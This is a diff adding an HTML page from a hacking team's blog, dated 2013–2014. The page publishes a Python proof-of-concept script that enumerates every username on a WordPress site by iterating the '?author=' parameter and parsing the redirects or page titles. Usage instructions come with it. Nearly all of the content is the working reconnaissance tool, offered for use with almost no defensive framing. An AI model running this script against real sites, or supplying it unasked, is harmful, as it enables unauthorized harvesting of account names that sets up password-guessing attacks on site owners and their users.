@@ -1,0 +1,118 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Wordpress the user traversal Poc - Hackersoul.com</title>
+  <meta name="keywords" content="HackerSoul,FF0000TEAM,Wordpress漏洞">
+  <meta name="description" content="Wordpress获取全部用户漏洞POC - FF0000 TeAm">
+  <link rel="stylesheet" type="text/css" href="/css/bootstrap.min.css">
+  <link rel="stylesheet" type="text/css" href="/css/hackersoul.css">
+  <link rel="shortcut icon" href="favicon.ico" type=image/x-icon>
+</head>
+
+<body>
+  <div class="header">
+    <img src="/img/hs_header.jpg" class="header-bg">
+  </div>
+  <div class="narrow-board">
+    <a class="logo-container" href="/" title="一个有情怀的黑客博客">
+      <img src="/img/hs_logo.png" class="logo">
+      <div class="slogan">Enjoy hacking, Enjoy life.</div>
+    </a>
+
+    <div class="post">
+      <pre>
+      <xmp>                           
+                     .::Wordpress the user traversal Poc::.
+
+                    We enjoy hacking of life in day and night.
+
+                _______________________________________________
+				
+                  [+] Author: Submarinexb
+                  [+] Team: FF0000 TEAM <http://www.ff0000.cc>
+                  [+] From: HackerSoul <http://www.hackersoul.com>
+                  [+] Create: 2013-12-25
+                _______________________________________________
+
+
+                                  -= Main =-
+
+We all know,Wordpress the existence of ergodic problem,So we can get all the username :)
+The following script relies on python requests library,So we can use this program traversal of all the user's user name.
+
+Method of use:
+[+] From: FF0000 TeAm
+[+] Date: 20131111
+[+] usage: python Wordpress_the_user_traversal_Poc.py <times> <url>
+
+The program source code:
+
+# coding: utf8
+# FF0000 TeAm
+import sys
+import re
+ 
+import requests
+ 
+def get_username(url):
+    username = url.strip("/").rsplit('/',1)[1]
+    return username
+ 
+ 
+def get_username_from_title(content):
+    title = get_title(content)
+    username = title.split()[0]
+    return username.replace('发表的所有文章','')
+ 
+ 
+def get_title(content):
+    title = re.findall('<title>.*</title>', content)[0]
+    return title[7:-8]
+ 
+ 
+def get_redirect_url(url, times):
+    names = []
+    if not url.startswith('http'):
+        url = 'http://' + url
+    if not url.endswith('/'):
+        url = url + '/'
+    url = url + '?author='
+    for i in range(1, times+1):
+        url_ = url + str(i)
+        resp = requests.get(url_)
+        if resp.status_code == 404:
+            print 'id: %d, not found' % i
+            continue
+        if resp.history:
+            username = get_username(resp.url)
+        else:
+            username = get_username_from_title(resp.content)
+        names.append(username)
+        print username
+    print '\n\nall users: \n'
+    for name in names:
+        print name
+ 
+ 
+if __name__ == '__main__':
+    if len(sys.argv) != 3:
+        print '[+] From: FF0000 TeAm'
+        print '[+] Date: 20131111'
+        print '[+] usage: python Wordpress_the_user_traversal_Poc.py <times> <url> '
+    else:
+        times = sys.argv[1]
+        url = sys.argv[2]
+        get_redirect_url(url, int(times))
+
+                                  -= END =-
+      </xmp>
+      </pre>
+    </div>
+
+    <div class="footer">
+	<span class="copy">&copy;&nbsp;</span>2014 FF0000 TeAm. <a href="/about.html" class="red-link">About Us</a>
+    </div>
+  </div>
+</body>
+</html>
